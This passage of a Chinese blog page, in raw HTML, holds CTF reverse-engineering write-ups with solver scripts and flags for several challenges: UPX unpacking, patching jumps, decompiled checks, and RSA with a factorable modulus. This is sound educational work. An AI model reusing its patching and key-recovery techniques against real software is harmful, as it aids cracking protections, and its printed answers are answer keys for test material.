class="string">&quot;&quot;</span></span><br><span class="line">result = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> v8 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14549743</span>):</span><br><span class="line">    v7 = (((v8 &lt;&lt; <span class="number">8</span>) ^ (v8 &gt;&gt; <span class="number">12</span>)) *<span class="number">291</span>) &amp; <span class="number">0xffffffff</span>  </span><br><span class="line">    <span class="keyword">if</span> (v7 == <span class="number">607052314</span>):</span><br><span class="line">        result = v8</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">    flag0 += <span class="built_in">chr</span>((result ^ i) &amp; <span class="number">0xff</span>)</span><br><span class="line">print(flag0)</span><br><span class="line">flag = hashlib.md5()</span><br><span class="line">flag.update(<span class="built_in">str</span>(result).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">print(<span class="string">&#x27;flag&#123;&#x27;</span> + flag.hexdigest() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304221944.png" alt="[V&amp;N2020 公开赛]strangeCpp005"></p><h1 id="SUCTF2019-SignIn"><a href="#SUCTF2019-SignIn" class="headerlink" title="[SUCTF2019]SignIn"></a>[SUCTF2019]SignIn</h1><h2 id="关键词：RSA"><a href="#关键词：RSA" class="headerlink" title="关键词：RSA"></a>关键词：RSA</h2><p>ida当中main函数如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304222048.png" alt="[SUCTF2019]SignIn001"></p><p>通过动态调试我们知道，sub_96A(&amp;v8, (__int64)&amp;v9);函数的作用就是将我们输入的v8转换为16进制存于v9，</p><p>__gmpz_init_set_str 函数原型为mpz_init_set_str，一个 GNU 高精度算法库，官方文档地址：<a href="https://gmplib.org/manual/">https://gmplib.org/manual/</a></p><p>官方文档如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">int mpz_init_set_str (mpz_t rop, const char *str, int base) [Function]</span><br><span class="line"></span><br><span class="line">Initialize rop <span class="keyword">and</span> <span class="built_in">set</span> its value like mpz_set_str</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">int mpz_set_str (mpz_t rop, const char *str, int base) [Function]</span><br><span class="line"></span><br><span class="line">Set the value of rop from str, a null-terminated C <span class="built_in">string</span> in base base. White space is allowed</span><br><span class="line"></span><br><span class="line">in the <span class="built_in">string</span>, <span class="keyword">and</span> is simply ignored.</span><br></pre></td></tr></table></figure><p>作用就是将 str 字符数组以 base 指定的进制转换为高精度整型，并写入 rop 所指向的内存。</p><p>__gmpz_powm函数原型为void mpz_powm (mpz_t rop, const mpz_t base, const mpz_t exp, const mpz_t mod)</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">void mpz_powm (mpz_t rop, const mpz_t base, const mpz_t exp, const mpz_t mod) [Function]</span><br><span class="line"></span><br><span class="line">Set rop to base^<span class="built_in">exp</span> mod mod.</span><br></pre></td></tr></table></figure><p>就是将base的exp次方模mod，将结果写入rop当中。</p><p>其实看到这儿我们可以看出来这就是个RSA算法：</p><p>C是密文，M是明文，E是公钥（E和 φ(N)互为质数），D是私钥，N是公共模数（质数 P 、Q相乘得到N），MOD就是模运算</p><p>该题给出的数据为：</p><p>C = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</p><p>N = 103461035900816914121390101299049044413950405173712170434161686539878160984549</p><p>E = 65537</p><p>现在分解大整数N，在线工具<a href="http://www.factordb.com/">http://www.factordb.com/</a></p><p>得到：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304222229.png" alt="[SUCTF2019]SignIn002"></p><p>p = 282164587459512124844245113950593348271</p><p>q = 366669102002966856876605669837014229419</p><p>然后我们可以根据pq计算出欧拉函数phin = (p-1)*(q-1)进而计算出私钥D  = gmpy2.invert(e, phin)</p><h2 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">已知p q（n分解两素数） n（公钥） c（密文） e（幂）</span></span><br><span class="line"><span class="string">算出私钥d，得到的结果为10进制数据，最终转换为string</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">n = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line"><span class="comment">#算出phin和私钥d</span></span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phin)</span><br><span class="line"><span class="comment">#算出m</span></span><br><span class="line"></span><br><span class="line">m = gmpy2.powmod(c, d, n)</span><br><span class="line"><span class="comment"># 现在我们得到的m是十进制数据，我们要将m转换为String 10-&gt;16-&gt;byte-&gt;str</span></span><br><span class="line">flag0 = <span class="built_in">hex</span>(m)[<span class="number">2</span>:]  <span class="comment"># flag0类型为str，存的是十六进制表示的字符串 [2:]目的是把0x抛去</span></span><br><span class="line">flag1 = <span class="built_in">bytes</span>.fromhex(flag0)  <span class="comment"># 将其从十六进制转换为byte类型(此时已解释成字符)</span></span><br><span class="line">flag = <span class="built_in">str</span>(flag1, <span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 将byte类型转换为str类型</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到flag：suctf{Pwn_@_hundred_years}</p><h1 id="Youngter-drive"><a href="#Youngter-drive" class="headerlink" title="Youngter-drive"></a>Youngter-drive</h1><h2 id="关键词：线程，堆栈，upx"><a href="#关键词：线程，堆栈，upx" class="headerlink" title="关键词：线程，堆栈，upx"></a>关键词：线程，堆栈，upx</h2><p>这个题比前几题要稍微麻烦点，但也还好。</p><p>运行程序如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304222539.png" alt="Youngter-drive001"></p><p>查壳</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304222553.png" alt="Youngter-drive002"></p><p>脱壳</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304222612.png" alt="Youngter-drive003"></p><p>ida查看main函数，两个线程同时工作，下表为奇数加密，偶数不加密，直接sleep。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304222629.png" alt="Youngter-drive004"></p><p>当中的报错内容可知411A04处存在堆栈不平衡。所以需要平衡一下堆栈</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304222649.png" alt="Youngter-drive005"></p><p>Windows–&gt;general–&gt;stack pointer，由于ret的堆栈指针为-0x4，所以我们需要Atl + K 将上方call处的堆栈调整为-0x4</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304222715.png" alt="Youngter-drive006"></p><p>然后进入关键的加密函数如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304222728.png" alt="Youngter-drive007"></p><p>418000h和418008h如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304222746.png" alt="Youngter-drive008"></p><h2 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">off_418000 = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line">off_418004 = <span class="string">&quot;TOiZiZtOrYaToUwPnToBsOaOapsySys&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:  <span class="comment">#不加密</span></span><br><span class="line">        flag += off_418004[i]</span><br><span class="line">    <span class="keyword">else</span>: <span class="comment">#加密</span></span><br><span class="line">        s = off_418000.find(off_418004[i])</span><br><span class="line">        <span class="keyword">if</span> s + <span class="number">38</span> &gt;= <span class="number">65</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(s + <span class="number">38</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(s + <span class="number">96</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h1 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a>[BJDCTF2020]JustRE</h1><p>很简单的一道题。</p><p>我选择的动态调试，查壳无壳，运行一下程序</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304223818.png" alt="[BJDCTF2020]JustRE000"></p><p>拖入od查看字符串，发现关键字符串如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304223835.png" alt="[BJDCTF2020]JustRE001"></p><p>定位到关键代码领空：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304223859.png" alt="[BJDCTF2020]JustRE002"></p><p>这里修改几个关键跳转便可以得到flag</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304223918.png" alt="[BJDCTF2020]JustRE003"></p><h1 id="简单注册器"><a href="#简单注册器" class="headerlink" title="简单注册器"></a>简单注册器</h1><p>一个简单的apk</p><p>jeb打开：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304224005.png" alt="简单注册器001"></p><p>定位到关键函数过后写出python脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table = <span class="string">&quot;dd2940c04462b4dd7c450528835cca15&quot;</span></span><br><span class="line">v5 = [i <span class="keyword">for</span> i <span class="keyword">in</span> table]</span><br><span class="line">v5[<span class="number">2</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v5[<span class="number">2</span>]) + <span class="built_in">ord</span>(v5[<span class="number">3</span>]) - <span class="number">50</span>)</span><br><span class="line">v5[<span class="number">4</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v5[<span class="number">2</span>]) + <span class="built_in">ord</span>(v5[<span class="number">5</span>]) - <span class="number">0x30</span>)</span><br><span class="line">v5[<span class="number">30</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v5[<span class="number">31</span>]) + <span class="built_in">ord</span>(v5[<span class="number">9</span>]) - <span class="number">0x30</span>)</span><br><span class="line">v5[<span class="number">14</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(v5[<span class="number">27</span>]) + <span class="built_in">ord</span>(v5[<span class="number">28</span>]) - <span class="number">97</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="comment">#v5[i],v5[31-i] = v5[31-i],v5[i]</span></span><br><span class="line">    v0 = v5[<span class="number">31</span> - i]</span><br><span class="line">    v5[<span class="number">31</span> - i] = v5[i]</span><br><span class="line">    v5[i] = v0</span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(v5) + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>flag{59acc538825054c7de4b26440c0999dd}</p></blockquote><h1 id="MRCTF2020-Transform"><a href="#MRCTF2020-Transform" class="headerlink" title="[MRCTF2020]Transform"></a>[MRCTF2020]Transform</h1><p>签到题</p><p>无壳，拖入ida静态分析，逻辑还是很简单：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304224134.png" alt="[MRCTF2020]Transform001"></p><p>flag按照dword_40F040当中的内容作为下标保存在byte_40F0E0数组中</p><p>然后异或。</p><h2 id="脚本-4"><a href="#脚本-4" class="headerlink" title="脚本"></a>脚本</h2><p>python：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dword_40F040 = [</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0F</span>, <span class="number">0x17</span>, <span class="number">0x07</span>, <span class="number">0x18</span>, <span class="number">0x0C</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x10</span>, <span class="number">0x03</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x20</span>, <span class="number">0x1D</span>, <span class="number">0x0B</span>, <span class="number">0x1E</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x19</span>, <span class="number">0x05</span>, <span class="number">0x1F</span>, <span class="number">0x08</span>, <span class="number">0x12</span>, <span class="number">0x1A</span>, <span class="number">0x1C</span>, <span class="number">0x0E</span>, <span class="number">0x0</span></span><br><span class="line">]</span><br><span class="line">byte_40F0E0 = [</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x7F</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x79</span>, <span class="number">0x57</span>, <span class="number">0x5E</span>,</span><br><span class="line">    <span class="number">0x5D</span>, <span class="number">0x42</span>, <span class="number">0x7B</span>, <span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, <span class="number">0x4C</span>, <span class="number">0x57</span>, <span class="number">0x79</span>, <span class="number">0x41</span>,</span><br><span class="line">    <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>, <span class="number">0x5C</span>, <span class="number">0x45</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x4D</span></span><br><span class="line">]</span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">33</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dword_40F040)):</span><br><span class="line">    byte_40F0E0[i] ^= dword_40F040[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dword_40F040)):</span><br><span class="line">    flag[dword_40F040[i]] = byte_40F0E0[i]</span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> flag]))</span><br></pre></td></tr></table></figure><p>C++：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> dword_40F040[<span class="number">33</span>] = &#123;</span><br><span class="line">        <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0F</span>, <span class="number">0x17</span>, <span class="number">0x07</span>, <span class="number">0x18</span>, <span class="number">0x0C</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x10</span>, <span class="number">0x03</span>,</span><br><span class="line">        <span class="number">0x11</span>, <span class="number">0x20</span>, <span class="number">0x1D</span>, <span class="number">0x0B</span>, <span class="number">0x1E</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, </span><br><span class="line">        <span class="number">0x15</span>, <span class="number">0x02</span>, <span class="number">0x19</span>, <span class="number">0x05</span>, <span class="number">0x1F</span>, <span class="number">0x08</span>, <span class="number">0x12</span>, <span class="number">0x1A</span>, <span class="number">0x1C</span>, <span class="number">0x0E</span>, <span class="number">0x0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> byte_40F0E0[<span class="number">33</span>] = &#123;</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x7F</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x79</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x42</span>, <span class="number">0x7B</span>, <span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, <span class="number">0x4C</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="number">0x79</span>, <span class="number">0x41</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>, <span class="number">0x5C</span>, <span class="number">0x45</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x4D</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">33</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; ++i)</span><br><span class="line">        flag[dword_40F040[i]] = byte_40F0E0[i] ^ dword_40F040[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; ++i)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; flag[i];</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ACTF新生赛2020-easyre"><a href="#ACTF新生赛2020-easyre" class="headerlink" title="[ACTF新生赛2020]easyre"></a>[ACTF新生赛2020]easyre</h1><h2 id="关键词：upx壳"><a href="#关键词：upx壳" class="headerlink" title="关键词：upx壳"></a>关键词：upx壳</h2><p>脱壳</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304224511.png" alt="[ACTF新生赛2020]easyre001"></p><p>拖入ida看main函数:v4=<em>data_start</em>_[输入的数组的每一位值-1]</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304224526.png" alt="[ACTF新生赛2020]easyre002"></p><h2 id="脚本-5"><a href="#脚本-5" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v4 = [<span class="number">42</span>, <span class="number">70</span>, <span class="number">39</span>, <span class="number">34</span>, <span class="number">78</span>, <span class="number">44</span>, <span class="number">34</span>, <span class="number">40</span>, <span class="number">73</span>, <span class="number">63</span>, <span class="number">43</span>, <span class="number">64</span>]</span><br><span class="line">data_start = <span class="built_in">chr</span>(<span class="number">0x7E</span>) + <span class="string">&quot;&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&quot;</span> + <span class="built_in">chr</span>(<span class="number">0x27</span>) + <span class="string">&#x27;&amp;%$# !&quot;&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v4:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(data_start)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="built_in">ord</span>(data_start[j]):</span><br><span class="line">            flag += <span class="built_in">chr</span>(j + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span> + flag + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h1><p>file一下文件：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304224634.png" alt="[GXYCTF2019]luck_guy001"></p><p>ida查看get_flag()函数</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 s; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )            <span class="comment">//获取了0~199的随机数</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:                          <span class="comment">//case1：flag = f1 + f2</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="keyword">char</span> *)&amp;s, f1);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="keyword">char</span> *)&amp;s, &amp;f2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">        s = <span class="number">0x7F666F6067756369</span>LL;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            v1 = *(&amp;f2 + j) - <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            v1 = *(&amp;f2 + j) - <span class="number">1</span>;</span><br><span class="line">          *(&amp;f2 + j) = v1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可看到，函数获取了0~199的随机数，</p><p>case1中，flag = f1 + f2，f1为 “GXY{do_not_” ，f2未知。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304224801.png" alt="[GXYCTF2019]luck_guy002"></p><p>case4中，f2赋值</p><p>case5中，f2处理</p><p>所以我们的顺序应该就是4 5 1</p><h2 id="脚本-6"><a href="#脚本-6" class="headerlink" title="脚本"></a>脚本</h2><p>python</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">f2 = [<span class="number">0x7F</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x60</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x69</span>][::-<span class="number">1</span>]</span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        tmp = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">1</span>)</span><br><span class="line">    flag += tmp</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>C++</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">string</span> flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">string</span> f1 = <span class="string">&quot;GXY&#123;do_not_&quot;</span>;</span><br><span class="line"><span class="built_in">string</span> f2 = <span class="string">&quot;fo`guci&quot;</span>;</span><br><span class="line">reverse(f2.begin(), f2.end());</span><br><span class="line">f2 += <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)    f2[i] -= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span>    f2[i] -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">flag = flag + f1;</span><br><span class="line">flag = flag + f2;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; flag &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">C脚本：</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> f1[] = <span class="string">&quot;GXY&#123;do_not_&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> f2[] = &#123; <span class="number">0x69</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x67</span>,<span class="number">0x60</span>,<span class="number">0x6f</span>,<span class="number">0x66</span>,<span class="number">0x7f</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">f2[i] -= <span 